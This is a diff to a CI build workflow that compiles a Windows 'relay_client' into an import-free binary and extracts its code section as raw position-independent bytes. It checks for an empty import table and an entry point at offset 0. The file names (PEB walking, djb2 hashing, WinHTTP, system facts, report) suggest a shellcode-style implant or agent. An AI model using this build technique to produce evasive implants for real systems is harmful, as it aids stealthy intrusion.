@@ -66,8 +66,8 @@ jobs:
           COMMIT_HASH=$(git rev-parse --short=8 HEAD)
           echo "=== building windows-${{ matrix.arch }} (${{ matrix.triple }}-gcc) ==="
           ${{ matrix.triple }}-gcc -O2 -s -nostdlib -Iinclude -Wall -Wextra \
-              -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector \
-              -Xlinker /entry:entry \
+              -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident \
+              -Wl,-T,link.text-first.ld -e entry \
               -DID_BUILD_NUMBER="$BUILD_NUMBER" \
               -DAGENT_COMMIT_HASH="\"$COMMIT_HASH\"" \
               -o relay_client.exe \
@@ -75,21 +75,15 @@ jobs:
               src/report.c src/system_facts.c src/environment.c src/winhttp_api.c \
               src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c \
               src/peb.c src/system.c src/djb2.c src/logger.c
-          ${{ matrix.triple }}-objcopy --dump-section .text=relay_client.bin relay_client.exe
+          ${{ matrix.triple }}-objcopy -O binary --only-section=.text relay_client.exe relay_client.bin
 
           imp=$(${{ matrix.triple }}-objdump -p relay_client.exe | grep -c 'DLL Name' || true)
           echo "imports: $imp (want 0)"
           [ "$imp" = "0" ] || { echo "FAIL: import table not empty"; exit 1; }
 
-          image_base=$(${{ matrix.triple }}-objdump -p relay_client.exe | sed -n 's/^[[:space:]]*ImageBase[[:space:]:]*//p' | awk '{print $1; exit}' | sed 's/^0x//')
-          entry_rva=$(${{ matrix.triple }}-objdump -p relay_client.exe | sed -n 's/^[[:space:]]*AddressOfEntryPoint[[:space:]:]*//p' | awk '{print $1; exit}' | sed 's/^0x//')
-          text_vma=$(${{ matrix.triple }}-objdump -h relay_client.exe | awk '$2 == ".text" {print $4; exit}' | sed 's/^0x//')
-          test -n "$image_base" || { echo "FAIL: could not read PE image base"; exit 1; }
-          test -n "$entry_rva" || { echo "FAIL: could not read PE entry RVA"; exit 1; }
-          test -n "$text_vma" || { echo "FAIL: could not read .text VMA"; exit 1; }
-          entry_rva=$(( 0x$image_base + 0x$entry_rva ))
-          text_rva=$(( 0x$text_vma ))
-          entry_off=$(( entry_rva - text_rva ))
+          start=$(${{ matrix.triple }}-objdump -f relay_client.exe | awk '/start address/{print $3}' | sed 's/^0x//')
+          text_vma=$(${{ matrix.triple }}-objdump -h relay_client.exe | awk '/\.text/{print $4; exit}')
+          entry_off=$(( 0x$start - 0x$text_vma ))
           echo "entry offset in .text: $entry_off (want 0)"
           [ "$entry_off" = "0" ] || { echo "FAIL: entry() is not at .text byte 0"; exit 1; }
 
